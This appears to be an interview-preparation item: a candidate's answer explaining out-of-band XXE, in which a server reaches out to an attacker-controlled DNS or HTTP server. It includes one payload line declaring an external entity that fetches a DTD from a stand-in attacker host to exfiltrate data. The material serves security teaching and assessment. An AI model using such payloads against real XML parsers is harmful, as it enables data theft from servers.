� Q8: What is Out-of-Band XXE? 
Candidate Answer: 
"Out-of-Band (OOB) XXE occurs when the server doesn’t return data in the HTTP response, but 
instead makes an external call — for example, to an attacker-controlled DNS or HTTP server. 
I usually test this by crafting a payload that forces the server to fetch a DTD or file and 
exfiltrates data over DNS. For instance, with a payload like <!ENTITY % ext SYSTEM 
'http://attacker.com/evil.dtd'>, I can trick the server into reaching out externally. 
This works best when blind responses are returned or when firewalls block regular XXE 
exfiltration." 
